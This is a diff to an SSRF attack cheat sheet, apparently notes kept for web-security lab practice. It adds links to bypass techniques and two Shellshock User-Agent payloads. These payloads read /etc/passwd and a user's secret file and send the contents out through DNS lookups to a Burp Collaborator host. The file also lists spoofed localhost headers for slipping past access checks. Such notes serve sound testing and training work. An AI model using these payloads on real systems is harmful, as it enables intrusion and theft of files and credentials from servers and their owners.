@@ -12,7 +12,9 @@ loopback network interface
 
 - [SSRF-via-host-validation-bypass-via-connection-state-attack](../Host-Header-Injection/SSRF-via-host-validation-bypass-via-connection-state-attack.md) ❗
 
-- [SSRF filter bypass](ssrf-bypasas-filter.md)
+- [SSRF filter bypass](ssrf-bypasas-filter.md) ❗
+
+- [SSRF via open redirect](SSRF-open-redirect.md)
 
 
 ## Methodology
@@ -40,6 +42,10 @@ loopback network interface
 
 ```
 () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN```
+User-Agent: () { :; }; /usr/bin/nslookup $(cat /etc/passwd | head -n 1 | head -c 4).BURP-COLLAB
+User-Agent: () { :; }; /usr/bin/nslookup $(cat /home/carlos/secret | head -n 1 | head -c 4).BURP-COLLAB
+
+
 ```
 
 Localhost bypass
@@ -50,7 +56,6 @@ X-Forward-For: localhost
 X-Remote-IP: localhost
 X-Client-IP: localhost
 X-Real-IP: localhost
-
 X-Originating-IP: 127.0.0.1
 X-Forwarded: 127.0.0.1
 Forwarded-For: 127.0.0.1
